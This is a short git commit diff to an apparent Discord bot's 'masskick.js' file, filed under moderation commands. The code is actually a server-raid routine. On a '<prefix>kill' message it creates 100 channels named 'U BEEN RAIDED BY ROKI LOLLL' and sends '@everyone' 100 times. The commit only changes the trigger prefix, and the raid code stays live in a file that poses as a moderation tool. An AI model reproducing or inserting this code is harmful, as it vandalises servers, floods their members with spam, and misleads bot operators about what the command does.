118125a630573c02d79f73d4a4c197286395ef9a
Ryo505 <abdrmsfr9@gmail.com>
2026-06-26 03:39:35 +0300

    Update masskick.js

--- src/commands/Moderation/masskick.js
+++ src/commands/Moderation/masskick.js
@@ -1,6 +1,5 @@
-if(message.content.startsWith( ".kill")){
-
- let i=0
+if(message.content.startsWith(Prefix + "kill")){
+let i=0
     for(i=0;i<100;i++) {message.guild.channels.create("U BEEN RAIDED BY ROKI LOLLL ")}
     for(i=0;i<100;i++) {message.channel.send("@everyone")}
   }
